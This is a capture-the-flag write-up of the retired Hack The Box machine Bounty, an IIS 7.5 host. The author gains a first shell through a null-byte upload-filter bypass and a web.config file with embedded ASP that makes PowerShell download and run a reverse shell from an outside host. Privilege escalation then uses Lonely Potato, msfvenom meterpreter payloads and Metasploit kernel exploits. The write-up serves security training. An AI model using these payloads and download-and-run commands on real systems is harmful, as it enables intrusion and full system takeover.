---
title: HTB: Bounty
url: https://0xdf.gitlab.io/2018/10/27/htb-bounty.html
date: 2018-10-27T14:36:57+00:00
difficulty: Easy [20]
os: Windows
tags: hackthebox, htb-bounty, ctf, asp, upload, nishang, lonelypotato, potato, meterpreter, ms10-051, ms16-014, web.config, sherlock, watson, oscp-like-v2, oscp-like-v1
---

![](https://0xdfimages.gitlab.io/img/bounty-cover.png) Bounty was one of the easier boxes I’ve done on HTB, but it still showcased a neat trick for initial access that involved embedding ASP code in a web.config file that wasn’t subject to file extension filtering. Initial shell provides access as an unprivileged user on a relatively unpatched host, vulnerable to several kernel exploits, as well as a token privilege attack. I’ll show a handful of ways to enumerate and to escalate privilege, including a really neat new tool, Watson. When I first wrote this post, Watson wouldn’t run on Bounty, but thanks to some quick work from Rasta Mouse and Mark S, I was able to update the post to include it.

## Box Info

| Name | [Bounty](https://hackthebox.com/machines/bounty)  [Bounty](https://hackthebox.com/machines/bounty) [Play on HackTheBox](https://hackthebox.com/machines/bounty) |
| --- | --- |
| Release Date | 16 Jun 2018 |
| Retire Date | 04 May 2024 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Bounty |
| Radar Graph | Radar chart for Bounty |
| First Blood User | 00:54:58[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| First Blood Root | 01:03:57[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| Creator | [mrb3n mrb3n](https://app.hackthebox.com/users/2984) |

## nmap

`nmap` only shows port 80, running IIS 7.5:

```

root@kali# nmap -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.93
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-18 09:33 EDT
Nmap scan report for 10.10.10.93
Host is up (0.10s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.76 seconds

root@kali# nmap -p 80 -sC -sV -oA nmap/initial 10.10.10.93
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-18 09:34 EDT
Nmap scan report for 10.10.10.93
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.92 seconds

```

## Port 80 - Web

### Site

The site itself just gives an image of a wizard, `merlin.jpg`:

![1529329106020](https://0xdfimages.gitlab.io/img/1529329106020.png)

### Server Identification

The response headers indicate that the site is powered by `ASP.NET`:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Thu, 31 May 2018 03:46:26 GMT
Accept-Ranges: bytes
ETag: "20ba8ef391f8d31:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Mon, 18 Jun 2018 13:39:22 GMT
Connection: close
Content-Length: 630

```

### gobuster

`gobuster` reveals two interesting paths:

```

root@kali# gobuster -u http://10.10.10.93 -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -o gobuster_root -x aspx

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.93/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Output file  : gobuster_root
[+] Status codes : 301,302,307,200,204
[+] Extensions   : .aspx
=====================================================
/transfer.aspx (Status: 200)
/uploadedFiles (Status: 301)
/uploadedfiles (Status: 301)
=====================================================

```

### transfer.aspx / UploadedFiles

#### General Functionality

`/transfer.aspx` presents a simple form with “Browse…” and “Upload” buttons:

![1529334462193](https://0xdfimages.gitlab.io/img/1529334462193.png)

After giving it a simple png file (in my example, a screen capture of the merlin image), the site reports success, and the image can be seen at `http://10.10.10.93/UploadedFiles/[image name]`:

![1540650392026](https://0xdfimages.gitlab.io/img/1540650392026.png)

![1529334448803](https://0xdfimages.gitlab.io/img/1529334448803.png)

![1540548519393](https://0xdfimages.gitlab.io/img/1540548519393.png)

#### Bypassing Upload Extension Filter

I’ll grab a copy of the aspx shell that comes with kali, and try to upload it. On first attempt to upload, the page rejects it:

![1529334638116](https://0xdfimages.gitlab.io/img/1529334638116.png)

I can bypass the filter by adding a null byte after our aspx so that the app thinks it’s a jpg, but then saves it as an aspx:

![1529409814265](https://0xdfimages.gitlab.io/img/1529409814265.png)

#### Getting Execution

Still, when I then view `http://10.10.10.93/UploadedFiles/cmdasp.aspx`, it returns an error:

![1529409908670](https://0xdfimages.gitlab.io/img/1529409908670.png)

This is an improvement, as I know we’ve passed the upload check. But we can’t get execution still.

#### web.config RCE

At this point, it’s hard to say what is causing the aspx webshell not to execute, but the error does provide a suggestion to modify the `web.config` file. The `web.config` file has settings and configuration data for web applications on IIS servers. It is similar to a `.htaccess` on an Apache server. It would be really interesting if I could modify it via upload.

But even more interestingly, according to [this post](https://soroush.secproject.com/blog/tag/unrestricted-file-upload/), I can potentially include asp code in the `web.config` and get it to run.

I started with a template from the post above, and uploaded it to the site. On visiting `http://10.10.10.93/uploadedfiles/web.config`, it returns 3, which means the code executed:

![1540549579070](https://0xdfimages.gitlab.io/img/1540549579070.png)

## Shell as merlin

### Prep

It’s certainly possible to get a webshell, but I’ll notice that the `UploadedFiles` path is being cleared out every few minutes. So I’ll opt to go directly to reverse shell. First, grab a copy of [Nishang’s Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Then add a line at the end to invoke a callback to me:

```

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 443

```

Now, since my asp skills are quite low, I started with the asp webshell that comes on kali (`/usr/share/webshells/asp/cmdasp.asp`), and started reading it to determine how code is actually executed. This part seemed most interesting:

```

  ' -- create the COM objects that we will be using -- '
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

  ' -- check for a command that we have posted -- '
  szCMD = Request.Form(".CMD")
  If (szCMD <> "") Then

    ' -- Use a poor man's pipe ... a temp file -- '
    szTempFile = "C:\" & oFileSys.GetTempName( )
    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)

  End If

```

So basically I need a `WSCRIPT.SHELL` COM object, and use it’s Run function to run a command. Ok, so because I only want to run one specific line to download and execute my Nishang shell, this should be simple. Here’s a `web.config` file that will start that process:

```

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')")
%>

```

### Execution

Now, I take two steps:
- Upload the web.config using the web form
- Visit `http://10.10.10.93/UploadedFiles/web.config`, which runs the asp code, which invokes PowerShell to download the Nishang shell, and then run it creating a connection back to me:

![shell gif](https://0xdfimages.gitlab.io/img/bounty-shell.gif)

### user.txt

Now with shell, I can grab `user.txt`. Strangely, it’s not present when I look for it:

```

PS C:\users\merlin\desktop> ls
PS C:\users\merlin\desktop>

```

It turns out that the file is there, it’s just hidden. If I re-run `Get-ChildItem` (or `gci` or `ls`) with the `-Force` flag, it shows up:

```

PS C:\users\merlin\desktop> gci -force

    Directory: C:\users\merlin\desktop

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a-hs         5/30/2018  12:22 AM        282 desktop.ini
-a-h-         5/30/2018  11:32 PM         32 user.txt

PS C:\users\merlin\desktop> cat user.txt
e29ad898...

```

## Privesc: merlin –> SYSTEM

### Enumeration

I’ve got a bunch of different methods here, but if you’re only going to read on, jump ahead to [Watson](#watson), as it’s brand new, and my favorite.

#### System Info

The fact is, this box is vulnerable to lots of privesc. A quick run of `system info` gives a pretty big hint that kernel exploits will be a potential path here:

```

PS C:\windows\microsoft.net\framework\v2.0.50727> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          10/22/2018, 3:56:47 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 4/5/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,573 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,614 MB
Virtual Memory: In Use:    481 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A                               <-- Uh oh!!!
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93

```

With no hotfixes, there’s a ton of exploits to look at.

#### Whoami /priv

Whenever I get access via a web service on a Windows host, I always check `whoami /priv`. If `SeImpersonatePrivilege` is present, I can likely get SYSTEM with [Lonely Potato](https://github.com/decoder-it/lonelypotato). That appears to be the case here:

```

PS C:\users\merlin\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

```

#### Sherlock

Another tool to try is [Sherlock](https://github.com/rasta-mouse/Sherlock). Unfortunately, it’s no longer being maintained, in favor of Watson (see [more on that later](#watson)). Still, it’s a quick PowerShell Script that will identify some kernel exploits.

Upload it, and then run `Find-AllVulns`. It looks like MS10-092 is a good candidate:

```

PS C:\users\merlin\appdata\local\temp> iex(new-object net.webclient).downloadstring('http://10.10.14.5/Sherlock.ps1')
PS C:\users\merlin\appdata\local\temp> Find-AllVulns

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Supported on single-core systems

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable

```

#### Watson

Seeing the deprecation of Sherlock in favor of [Watson](https://github.com/rasta-mouse/Watson), I decided to check it out. Rather than PowerShell, it’s a C# implementation. This means a little more work before deployment.

To build it, I’ll use a Windows VM I have set up Visual Studio on. On that VM, I’ll download the git repo as a zip from the website, and open the `Watson.sln` file. When you download code from github, it’s always a good idea to make sure the project builds before you change anything, so that if something breaks, you know it was you.

So, I’ll go to “Build” –> “Build Solution”, and see the output like this:

![1540586312675](https://0xdfimages.gitlab.io/img/1540586312675.png)

And, if I go to that folder and run it, it works:

![1540586348018](https://0xdfimages.gitlab.io/img/1540586348018.png)

I can take that binary over to Bounty and run it, but nothing will return. Why? Rasta Mouse explained that in this post: <https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/>

The TL;DR is that you have to build the exe to match the version of .NET installed on target.

From Bounty:

```

PS C:\windows\microsoft.net\framework\v2.0.50727> \windows\microsoft.net\framework\v2.0.50727\msbuild -version
Microsoft (R) Build Engine Version 2.0.50727.4927
[Microsoft .NET Framework, Version 2.0.50727.4927]
Copyright (C) Microsoft Corporation 2005. All rights reserved.
2.0.50727.4927

```

So back in Visual Studio, “Project” –> “Watson Properties…” will launch a window where I can set the “Target Framework”:

![1540586719230](https://0xdfimages.gitlab.io/img/1540586719230.png)

When I had originally written this post, this is where things failed. Watson wouldn’t compile for .NET Framework 2.0:

![1540586764022](https://0xdfimages.gitlab.io/img/1540586764022.png)

But, thanks to super quick work from Rasta Mouse and Mark-S, they updated it this morning, and it works now.

So build again with .NET Framework 2.0, copy it over to Bounty, and run it:

```

PS C:\users\merlin\appdata\local\temp> (new-object net.webclient).downloadfile('http://10.10.14.5/Watson.exe', '\users\merlin\appdata\local\temp\watson.exe')
PS C:\users\merlin\appdata\local\temp> .\watson.exe
  __    __      _
 / / /\ \ \__ _| |_ ___  ___  _ __
 \ \/  \/ / _` | __/ __|/ _ \| '_ \
  \  /\  / (_| | |_\__ \ (_) | | | |
   \/  \/ \__,_|\__|___/\___/|_| |_|

                           v0.1

                  Sherlock sucks...
                   @_RastaMouse

 [*] OS Build number: 7600
 [*] CPU Address Width: 64
 [*] Process IntPtr Size: 8
 [*] Using Windows path: C:\WINDOWS\System32

  [*] Appears vulnerable to MS10-073
   [>] Description: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel.
   [>] Exploit: https://www.exploit-db.com/exploits/36327/
   [>] Notes: None.

  [*] Appears vulnerable to MS10-092
   [>] Description: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Also, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision, an attacker can execute arbitrary commands with SYSTEM privileges.
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb
   [>] Notes: None.

  [*] Appears vulnerable to MS11-046
   [>] Description: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges.
   [>] Exploit: https://www.exploit-db.com/exploits/40564/
   [>] Notes: None.

  [*] Appears vulnerable to MS12-042
   [>] Description: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in kernel mode.
   [>] Exploit: https://www.exploit-db.com/exploits/20861/
   [>] Notes: None.

  [*] Appears vulnerable to MS13-005
   [>] Description: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation.
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb
   [>] Notes: None.

 [*] Finished. Found 5 vulns :)
ERROR> The given key was not present in the dictionary.
ERROR> C:\WINDOWS\System32\drivers\mrxdav.sys
ERROR> C:\WINDOWS\System32\win32kfull.sys
ERROR> C:\WINDOWS\System32\gdiplus.dll
ERROR> C:\WINDOWS\System32\pcadm.dll
ERROR> C:\WINDOWS\System32\coremessaging.dll

```

The errors are not failure, it’s just that those files aren’t on this version of Windows. Watson provides a comprehensive list of vulnerabilities. Given my desire to avoid Metasploit, I suspect I’ll be using for this tool going forward.

#### Metasploit

Metasploit has a very nice, built in, exploit suggester. I’ll need a meterpreter shell. First, generate some PowerShell as a loader:

```

root@kali# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=445 -f psh -o www/met-445.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of psh file: 3216 bytes
Saved as: www/met-445.ps1

```

The `-f psh` will output a PowerShell command that will initiate a reverse tcp meterpreter shell.

Start `exploit/multi/handler`:

```

msf exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.5       yes       The listen address (an interface may be specified)
   LPORT     445              yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:445

```

Now get and run PowerShell launcher from my Nishang shell:

```

PS C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.5/met-445.ps1')
1748

```

And get meterpreter:

```

[*] Sending stage (206403 bytes) to 10.10.10.93
[*] Meterpreter session 1 opened (10.10.14.5:445 -> 10.10.10.93:49198) at 2018-10-26 15:51:15 -0400

meterpreter > getuid
Server username: BOUNTY\merlin

```

Now, I’ll background that and use `use post/multi/recon/local_exploit_suggester`, and see it gives a few options (though not as many as Watson):

```

msf post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.93 - Collecting local exploits for x64/windows...
[*] 10.10.10.93 - 18 exploit checks are being tried...
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Post module execution completed

```

### Escalation Method 1: Lonely Potato

I’ll grab a copy of the the [compiled lonelypotato binary](https://github.com/decoder-it/lonelypotato/blob/master/RottenPotatoEXE/MSFRottenPotato.exe) and upload it to target, along with a bat script that will start another Nishang shell:

```

PS C:\users\merlin\appdata\local\temp> (new-object net.webclient).downloadfile('http://10.10.14.5/lonelypotato.exe', 'C:\users\merlin\appdata\local\temp\lp.exe')
PS C:\users\merlin\appdata\local\temp> (new-object net.webclient).downloadfile('http://10.10.14.5/rev.bat', 'C:\users\merlin\appdata\local\temp\rev.bat')

PS C:\users\merlin\appdata\local\temp> type rev.bat
powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')

```

Now run it, and get a shell:

```

PS C:\users\merlin\appdata\local\temp> C:\users\merlin\appdata\local\temp\lp.exe * C:\users\merlin\appdata\local\temp\rev.bat
CreateIlok: 0 0
CreateDoc: 0 0
connect sock
start RPC  connection
COM -> bytes received: 116
RPC -> bytes Sent: 116
RPC -> bytes received: 84
COM -> bytes sent: 84
COM -> bytes received: 24
RPC -> bytes Sent: 24
RPC -> bytes received: 136
COM -> bytes sent: 136
COM -> bytes received: 135
RPC -> bytes Sent: 135
RPC -> bytes received: 216
COM -> bytes sent: 216
COM -> bytes received: 158
RPC -> bytes Sent: 158
RPC -> bytes received: 56
COM -> bytes sent: 56
CoGet: -2147022986 0
[+] authresult != -1
[+] Elevated Token tye:2
[+] DuplicateTokenEx :1  0
[+] Duped Token type:1
[+] Running C:\users\merlin\appdata\local\temp\rev.bat sessionId 1
[+] CreateProcessWithTokenW OK
Auth result: 0
Return code: 0
Last error: 0

```

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.93] 49190
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system

```

### Escalation Method 2: Kernel Exploits - Metasploit

Unfortunately, I didn’t have a good implementation of one of these kernel exploits that fits my current situation outside of Metasploit. There are lots of pre-compiled exes on github, but they typically open a new cmd window, which isn’t helpful here. And, since I got a Meterpreter shell already for enumeration, I’ll make good use of it:

```

msf exploit(windows/local/ms10_092_schelevator) > options

Module options (exploit/windows/local/ms10_092_schelevator):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION   1                yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.5       yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008

msf exploit(windows/local/ms10_092_schelevator) > run

[*] Started reverse TCP handler on 10.10.14.5:443
[*] Preparing payload at C:\Windows\TEMP\qqTMYhyeIn.exe
[*] Creating task: FnB0882rp0ZAqjr
[*] SUCCESS: The scheduled task "FnB0882rp0ZAqjr" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\FnB0882rp0ZAqjr...
[*] Original CRC32: 0xd3070e6a
[*] Final CRC32: 0xd3070e6a
[*] Writing our modified content back...
[*] Validating task: FnB0882rp0ZAqjr
[*]
[*] Folder: \
[*] TaskName                                 Next Run Time          Status
[*] ======================================== ====================== ===============
[*] FnB0882rp0ZAqjr                          11/1/2018 10:55:00 PM  Ready
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "FnB0882rp0ZAqjr" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "FnB0882rp0ZAqjr" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (206403 bytes) to 10.10.10.93
[*] SUCCESS: Attempted to run the scheduled task "FnB0882rp0ZAqjr".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.5:443 -> 10.10.10.93:49201) at 2018-10-26 15:57:56 -0400
[*] SUCCESS: The scheduled task "FnB0882rp0ZAqjr" was successfully deleted.
[*] SCHELEVATOR

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

While I’m here, I gave MS16-014 a run, and it worked as well:

```

msf exploit(windows/local/ms16_014_wmi_recv_notif) > run

[*] Started reverse TCP handler on 10.10.14.5:4444
[*] Launching notepad to host the exploit...
[+] Process 312 launched.
[*] Reflectively injecting the exploit DLL into 312...
[*] Injecting exploit into 312...
[*] Exploit injected. Injecting payload into 312...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (206403 bytes) to 10.10.10.93
[*] Meterpreter session 3 opened (10.10.14.5:4444 -> 10.10.10.93:49202) at 2018-10-26 15:59:54 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

### root.txt

With any of these shells, I can grab root.txt:

```

PS C:\users\administrator\desktop> type root.txt
c837f7b6...

```